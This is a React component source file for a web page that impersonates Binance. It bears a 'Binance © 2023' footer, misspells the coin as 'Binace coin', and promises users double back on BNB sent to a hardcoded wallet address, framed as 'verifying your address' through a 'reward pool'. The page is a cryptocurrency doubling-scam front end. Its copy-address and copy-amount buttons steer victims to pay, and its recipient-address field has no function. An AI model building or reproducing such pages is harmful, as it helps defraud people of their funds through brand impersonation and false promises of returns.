import { useState } from "react";

export default function Test() {

    const [amount, setAmount] = useState('');
    const [approve, setApporve] = useState(false);
    const [copied, setCopied] = useState(false);
    const [value, setValue] = useState(false);

    const Address = "bnb19yady63vq9whq0xgspp4v4xxhuf5808qsw9mze";

    function handleAmount(event) {
        const inputValue = parseFloat(event.target.value);
        if (isNaN(inputValue) || inputValue < 2) {
            setAmount(0);
        } else {
            setAmount(inputValue * 2);
        }
    }


    function handleApprove() {
        setApporve(true);
    }

    const copyText = () => {
        navigator.clipboard.writeText(Address)
            .then(() => {
                setCopied(true);
                setTimeout(() => {
                    setCopied(false);
                }, 2000);
            })
            .catch(err => {
                console.error("Failed to copy: ", err);
            });
    };

    const copyAmount = () => {
        navigator.clipboard.writeText(amount / 2)
            .then(() => {
                setValue(true);
                setTimeout(() => {
                    setValue(false);
                }, 2000);
            })
            .catch(err => {
                console.error("Failed to copy: ", err);
            });
    };

    return (
        <div className="css-1bx211v">
            <div className="css-1rs9gl">
                <div className="rules">
                    <div>
                        <p className="small-text">To verify your Address, You are required to make deposit into the reward pool. You will receive a 2x of the deposit made to the generated address.</p>
                    </div>
                    <div >
                        <div className="richtext-container list-text">
                            <p>Step1: Make sure you have at least 1 ETH or above in your wallet.</p>
                            <p>Step2: Enter the amount you wish to invest below.</p>
                            <p>Step3: Enter your ETH address</p>
                            <p>Step4: Click the Generate Payment button to generate the payment address.</p>
                            <p>Step5: Make deposit to generated address.</p>
                            <p>Step6: Confirm payment.</p>
                            <p>Step7: Wait for at least 10 - 18 minutes.</p>
                        </div>

                    </div>
                </div>
            <div className="calculate">
                    <div className="calculator participateLeft">
                        <div className="calculatorInput formContainer">
                            <div className="title"> Enter the amount </div>
                            <div className="block">
                                <div className="info">
                                    <div className="header"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAn9SURBVHgB1ZxdbBTXFcfPvTO7/lqTdaBtSj8wLdA2doohfaAvzdI2Mnkq7kvy0tooROpLix2F0KcCbR/SIgXTp0htZNOnpFJl+lBRoBKmfSiRUrDBpiSq6nWaNFQh2OCv9e7M3JxzxzPsx8zu3PVcbP7Swnjm7p2Z355z7rkfMwweoGZG2tPQ0txucv4UWM5W4HyLANZFxxiI9uKyuD+L+2ZxcxYcZxxMPmUJGG97emIUHqAYaBZBMVtTveDAfjxbF955GlavUcbFcKFgX2p75mYWNEoLoBIoABnQKwkr9d3J06BBsQKSYFKpQ7jZH5OlRBa6Y1YwNmxZ1uk4rSoWQGsJplweqNanJ45DDFo1oJkLnZmEEEMYVNthHYlAMVP0t3z7xp9gFaobEFmNkWo9yoToh3UsxthgYd443tYzNgt1qC5AM2e/2p4wjIvrzWrCRNZUsO299cQmDooilzJN8+rDAodE12oa5tV7557YD4pSAjT3185DpoCLax2I61SaMTFy9y8dSiEhMqC5C51HMa8ZBI1iyU3AGj4FOsU5OynvJaIixSCyHO1wGjZB05Ovy+2lfz4PYvk26JTjiIFH9k3WvKeagO6d+9p+xowR0CiWSEPj7tfA2NAh/3YW/gOLl5/FjRxoFYO9rTX6dlVdjForxo0h0CiC0/D1Ez4ceVEtX0Jr+i1uNIJWCRihe6xWJBQQ5TnUlOsMyB4c89E9FceMdJcLydAKSd7jzEhX6D2GAqIkUGdTLuE8EQzHvwaCtFuvJdE9JlJ2aNAOjEEzmC+Y2CSCJvlwNu6JVN6eHcfAfVBvTAqJR4EWlGDOSdB1HZ5bRYRDMtI7tcck7DINBblaBSDKEXS5Fmt8LDTm1JIXk6gOHaJ75s1WRRJZ4mI6+1h0Y01P/g548xZYjZzFaeluIncLNGjWWjC3FndsSywI+1i96xkOieqghFKTJaXLragEEPphH8QsNTgCoog3f1HWqQMSZ3CoOBb5gO6df7wvbutRhZPPnob89O8hijRaUpo3Ffr883gbDHgvxKi64Px7EPLvnlCApMeSsEP7PW9bBmkKzjheMgUxSR3OMML5DW5a/t7kjsOQ3PJDiCJn8T23gxtj4MZg3UbBWlqQYfAMxKT64JwqgUNaa0vy3EwCitO9eMuXcVzn0QglPbciy7EDS6hAYsmNwFPbIS55biZdbO58Z7TmI6KMT38HGjt+AcxsDSlRbDl2zfpquZuw5iF34yjY/z8PMUrmRMbM2c4M59AHMUosTOFFz4Gx8Zs4q2BUHC/cOg/5m7+MBIdk33kL3Qin8lPbAo8vY132h3+GmNXoJK03OTdFF2iQ9f4fYPmdX4Fwlkv2F26dg+WJn0aGI4VlcxNHwMLvludKuRs/A+sDPf1q7rAMB8HaoV5h5zHxeRz5C7ASkgvp1z4kiifLeKPlAdmTsekp/Hwr8JgHiVzTg0RuFQ5HQGJzj+wc1y+cDcEovRPqEW+QnUfqabOmz4XGE4Ikizd+1i0TIhPBNOx8VQbFpfEBsG//rbIQ1i+DOt68s5itajlu3OoF884/IHftZRAF9XlDnAVpZxigr+K2mpuh5bhwvK9R0B2q2iJVE1lN486TwHjS3WHnYelaCKSaEj4cT/bHlyF3/bAyJJpw5Ni9ULPBCjhuVcn2A5DcdijU3cJEblUCR+5MQhPuC3W3UFXCkdXh2FMjDtDV4268fGVXNdG8VfOeN8vg+EcRUp8SJBfOq6Vw/CtThxQExz8XQmra9ZqcXooqOUYUtbCct/rG63LGoUqpIkhmtepkzAmF40kBUnLHS6Fw/Ooe6XA7uAqQok89R04lmWtBIS2VanXCq7PqKfHHEA5Eq5WBypqNyIBE/jYsvX0Q7HuTVctRU05dhFqiAJwb76/Ik0rO6eSxzItY9lL1yvDHoAaiOAUIEk1IurO2H0FUUZDORi0s8h9B7sqPwLpzOfB4VDie7Nt/RwADgZAiw/G/4EGipYqVkOy747D41rNKcGQrBoqipnL52mFM/0shqcLxFARJGY7/RUvmWuWWRHDktJGtNm2ENcxyHGYdA0URpBxC8iypFhxz835Ibh8Ibd3uQ8pHgIMZ8rZ+SHzhuZDDpe5mz44hnBeU4bhis6bDYFrZjOC+JVnYc7c++GNoOYJDPXv3F2WhGbcHyd0OSRARcHL7i27PHkGSCv99I+DiXEhi6X9Q+PBMnXBoBQiMs7sXOvq5YFomCk3sCzV2/LxojwALhyRy14+oZ9wIp6HzFUg8tu/+PoS0/M4JKLz/BugQLZHhTl6MggaZm79fBofEwPxMN2a1r6hl3EFwSJgnNXzlMHaYnwMd4gYb49CczOJ117UCNEwEgS48/Pg+6SqR8hbMcSjxTGCdgUJIye39ss64RXP1vG0vziIKUA7UYaKst+HxY3hfqarlKI4kd7wMVSFJOD/Bsn3Uta5SrEWe09iUgRg1Sv/I+OwwsarF1sVy5t/FfOnjSGWrQooIxxMlss78TYhL2LoP0/8uIDMxDDGJpl4o56A59CgKhKQIx532iXe+vuDYMs+QgKSbrZhUHPIhLahAOgISkjKc6djnxFCj3qJzv8tNbobNfQZikoR05SA07cY5spbac2TJLT9Y+aIVHc7Ce/Icca/08NxLbnsbMxe70qZlTcW9JlF5ZYcQCpYTPxwhRHZD9+RW728/iSY3w8zxFMQs1Zi0VjHHPz2wkgfzSnoZTtIcjDsnIilDqiJNMUeKrMdyrOHifSWAdFmRPPkKJOo81isaQdC4ukxaT/kTQRX2TLHIyBeuMsbaQYeMRrm0N3hcO1z1zkxEVXns8VTRkScrYg47ALqEPWtVSyLL0QnHFR8I3Bu0s/UZuV5Yi6tJ4eDY0pUXIkGieXkae9IKB8PKhu7rZ4IOhQ4FWQnzGJkd6BJZUg1I0nKuvaQVjgzMS/PHwo6HAiJXsx17r45WzZcPabzyEMUczZZDQ6p0j2092dCTVB1MlBHdgh7QKRmTnpczDv6uu5MPIOYADdodqPUca83RVopHNLIGOkUx6e2DEhJ9cuM/1g6H4T1t6P7XmZrlIKLmznXiIA9EfpSxHtHUNl2R7qcN0beOt3ZPHItSVOmxcHoglp75hIdYZDmpCI9i+uVBUfRoNeNi6GF78pkCMrOhZyWFiay6XyxgcOOitmw7ZlFTLlurB/FiARKdyE4mdoHOZDIuYRJoLy7sqveNMKt+uYn7NgPn5HqzJrIa6jKpulS5Ynt/ELVyAkTvWoOSsUbAKWtxfrBaAhhV8b5giZ754GbfWoCKG4wnbe8wo8erVh5xyIBejeLnjLUwfzpOMJ60AfIkWzyDZ+KCJS0F5ESnNijF0g6oXHNnOzNgwE5w5GsCaY12mlbaBr0mEOQFijEsO41lpxg4lwoLi1ndUIr1CYQzCj+G5eBkAAAAAElFTkSuQmCC" alt="Binance coin" className="icon" width="24" /><span className="name">Binace coin</span></div>
                                </div>
                                <div className="formGroup">
                                    <div><label className="input"><input onChange={handleAmount} placeholder="Enter Amount" type="number" /><span className="currency">BNB</span></label>
                                        <div className="group"><small className="small"> Min: <span>2 BNB</span></small><small
                                            className="small"> Max: <span>250 BNB</span></small></div>
                                    </div>

                                </div>
                            </div>
                        </div>
                        <div className="calculatorInput formContainer">
                            <div className="title"> Amount to receive <span>2X</span> back </div>
                            <div className="block">
                                <div className="info">
                                    <div className="header"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAn9SURBVHgB1ZxdbBTXFcfPvTO7/lqTdaBtSj8wLdA2doohfaAvzdI2Mnkq7kvy0tooROpLix2F0KcCbR/SIgXTp0htZNOnpFJl+lBRoBKmfSiRUrDBpiSq6nWaNFQh2OCv9e7M3JxzxzPsx8zu3PVcbP7Swnjm7p2Z355z7rkfMwweoGZG2tPQ0txucv4UWM5W4HyLANZFxxiI9uKyuD+L+2ZxcxYcZxxMPmUJGG97emIUHqAYaBZBMVtTveDAfjxbF955GlavUcbFcKFgX2p75mYWNEoLoBIoABnQKwkr9d3J06BBsQKSYFKpQ7jZH5OlRBa6Y1YwNmxZ1uk4rSoWQGsJplweqNanJ45DDFo1oJkLnZmEEEMYVNthHYlAMVP0t3z7xp9gFaobEFmNkWo9yoToh3UsxthgYd443tYzNgt1qC5AM2e/2p4wjIvrzWrCRNZUsO299cQmDooilzJN8+rDAodE12oa5tV7557YD4pSAjT3185DpoCLax2I61SaMTFy9y8dSiEhMqC5C51HMa8ZBI1iyU3AGj4FOsU5OynvJaIixSCyHO1wGjZB05Ovy+2lfz4PYvk26JTjiIFH9k3WvKeagO6d+9p+xowR0CiWSEPj7tfA2NAh/3YW/gOLl5/FjRxoFYO9rTX6dlVdjForxo0h0CiC0/D1Ez4ceVEtX0Jr+i1uNIJWCRihe6xWJBQQ5TnUlOsMyB4c89E9FceMdJcLydAKSd7jzEhX6D2GAqIkUGdTLuE8EQzHvwaCtFuvJdE9JlJ2aNAOjEEzmC+Y2CSCJvlwNu6JVN6eHcfAfVBvTAqJR4EWlGDOSdB1HZ5bRYRDMtI7tcck7DINBblaBSDKEXS5Fmt8LDTm1JIXk6gOHaJ75s1WRRJZ4mI6+1h0Y01P/g548xZYjZzFaeluIncLNGjWWjC3FndsSywI+1i96xkOieqghFKTJaXLragEEPphH8QsNTgCoog3f1HWqQMSZ3CoOBb5gO6df7wvbutRhZPPnob89O8hijRaUpo3Ffr883gbDHgvxKi64Px7EPLvnlCApMeSsEP7PW9bBmkKzjheMgUxSR3OMML5DW5a/t7kjsOQ3PJDiCJn8T23gxtj4MZg3UbBWlqQYfAMxKT64JwqgUNaa0vy3EwCitO9eMuXcVzn0QglPbciy7EDS6hAYsmNwFPbIS55biZdbO58Z7TmI6KMT38HGjt+AcxsDSlRbDl2zfpquZuw5iF34yjY/z8PMUrmRMbM2c4M59AHMUosTOFFz4Gx8Zs4q2BUHC/cOg/5m7+MBIdk33kL3Qin8lPbAo8vY132h3+GmNXoJK03OTdFF2iQ9f4fYPmdX4Fwlkv2F26dg+WJn0aGI4VlcxNHwMLvludKuRs/A+sDPf1q7rAMB8HaoV5h5zHxeRz5C7ASkgvp1z4kiifLeKPlAdmTsekp/Hwr8JgHiVzTg0RuFQ5HQGJzj+wc1y+cDcEovRPqEW+QnUfqabOmz4XGE4Ikizd+1i0TIhPBNOx8VQbFpfEBsG//rbIQ1i+DOt68s5itajlu3OoF884/IHftZRAF9XlDnAVpZxigr+K2mpuh5bhwvK9R0B2q2iJVE1lN486TwHjS3WHnYelaCKSaEj4cT/bHlyF3/bAyJJpw5Ni9ULPBCjhuVcn2A5DcdijU3cJEblUCR+5MQhPuC3W3UFXCkdXh2FMjDtDV4268fGVXNdG8VfOeN8vg+EcRUp8SJBfOq6Vw/CtThxQExz8XQmra9ZqcXooqOUYUtbCct/rG63LGoUqpIkhmtepkzAmF40kBUnLHS6Fw/Ooe6XA7uAqQok89R04lmWtBIS2VanXCq7PqKfHHEA5Eq5WBypqNyIBE/jYsvX0Q7HuTVctRU05dhFqiAJwb76/Ik0rO6eSxzItY9lL1yvDHoAaiOAUIEk1IurO2H0FUUZDORi0s8h9B7sqPwLpzOfB4VDie7Nt/RwADgZAiw/G/4EGipYqVkOy747D41rNKcGQrBoqipnL52mFM/0shqcLxFARJGY7/RUvmWuWWRHDktJGtNm2ENcxyHGYdA0URpBxC8iypFhxz835Ibh8Ibd3uQ8pHgIMZ8rZ+SHzhuZDDpe5mz44hnBeU4bhis6bDYFrZjOC+JVnYc7c++GNoOYJDPXv3F2WhGbcHyd0OSRARcHL7i27PHkGSCv99I+DiXEhi6X9Q+PBMnXBoBQiMs7sXOvq5YFomCk3sCzV2/LxojwALhyRy14+oZ9wIp6HzFUg8tu/+PoS0/M4JKLz/BugQLZHhTl6MggaZm79fBofEwPxMN2a1r6hl3EFwSJgnNXzlMHaYnwMd4gYb49CczOJ117UCNEwEgS48/Pg+6SqR8hbMcSjxTGCdgUJIye39ss64RXP1vG0vziIKUA7UYaKst+HxY3hfqarlKI4kd7wMVSFJOD/Bsn3Uta5SrEWe09iUgRg1Sv/I+OwwsarF1sVy5t/FfOnjSGWrQooIxxMlss78TYhL2LoP0/8uIDMxDDGJpl4o56A59CgKhKQIx532iXe+vuDYMs+QgKSbrZhUHPIhLahAOgISkjKc6djnxFCj3qJzv8tNbobNfQZikoR05SA07cY5spbac2TJLT9Y+aIVHc7Ce/Icca/08NxLbnsbMxe70qZlTcW9JlF5ZYcQCpYTPxwhRHZD9+RW728/iSY3w8zxFMQs1Zi0VjHHPz2wkgfzSnoZTtIcjDsnIilDqiJNMUeKrMdyrOHifSWAdFmRPPkKJOo81isaQdC4ukxaT/kTQRX2TLHIyBeuMsbaQYeMRrm0N3hcO1z1zkxEVXns8VTRkScrYg47ALqEPWtVSyLL0QnHFR8I3Bu0s/UZuV5Yi6tJ4eDY0pUXIkGieXkae9IKB8PKhu7rZ4IOhQ4FWQnzGJkd6BJZUg1I0nKuvaQVjgzMS/PHwo6HAiJXsx17r45WzZcPabzyEMUczZZDQ6p0j2092dCTVB1MlBHdgh7QKRmTnpczDv6uu5MPIOYADdodqPUca83RVopHNLIGOkUx6e2DEhJ9cuM/1g6H4T1t6P7XmZrlIKLmznXiIA9EfpSxHtHUNl2R7qcN0beOt3ZPHItSVOmxcHoglp75hIdYZDmpCI9i+uVBUfRoNeNi6GF78pkCMrOhZyWFiay6XyxgcOOitmw7ZlFTLlurB/FiARKdyE4mdoHOZDIuYRJoLy7sqveNMKt+uYn7NgPn5HqzJrIa6jKpulS5Ynt/ELVyAkTvWoOSsUbAKWtxfrBaAhhV8b5giZ754GbfWoCKG4wnbe8wo8erVh5xyIBejeLnjLUwfzpOMJ60AfIkWzyDZ+KCJS0F5ESnNijF0g6oXHNnOzNgwE5w5GsCaY12mlbaBr0mEOQFijEsO41lpxg4lwoLi1ndUIr1CYQzCj+G5eBkAAAAAElFTkSuQmCC" alt="Binance coin" className="icon" width="24" /> <span className="name">Binace coin</span></div>
                                </div>
                                <div><label className="input"><input defaultValue={amount} placeholder="Waiting for input..." type="number" /><span
                                    className="currency">BNB</span></label>
                                    <div className="group"><small className="small"> Min: <span>5 BNB</span></small><small
                                        className="small"> Max: <span>500 BNB</span></small></div>
                                </div>
                            </div>
                            <div className="formInput-2 formInput  formInputWithButton">
                                <p>Recipient Address</p>
                                <input className="input"
                                    placeholder="receivers wallet address" type="text" /><button onClick={handleApprove} className={approve ? "clicked" : ""}>{approve ? "Saved" : "Confirm"}</button>
                            </div>
                        </div>
                    </div>
                    <div className="form formContainer participateRight">
                        <div className="title">
                            <p> Make a transfer to the <span>specified</span> address to receive <span>2X</span> back </p>
                            <div className="waiting"><img width="24" alt="" /><span>Waiting for
                                payment</span></div>
                        </div>
                        <div className="formGroup">
                            <div className="formInput formInputWithButton">
                                <p>Participation wallet</p>
                                <div className="input">
                                    <div className="value">{Address}</div>
                                </div><button onClick={copyText} className="">{copied ? "Copied!" : "Copy address"}</button>
                            </div>
                            <div className="formInput formInputWithButton">
                                <p>Participation amount</p>
                                <div className="input"><span className="errorText"> The minimum value allowed is
                                    2 BNB</span><span>BNB</span></div><button onClick={copyAmount} className="">{value ? "Copied!" : "Copy Amount"}</button>
                            </div>
                            <div className="qr"><img className="canvas" width={132} height={132} ></img> </div>
                        </div>
                    </div>
            </div>   
            <div className="css-223shg">
                <div data-bn-type="text" className="css-vurnku">Binance © 2023</div>
            </div>
          </div>
      </div>  
    )
}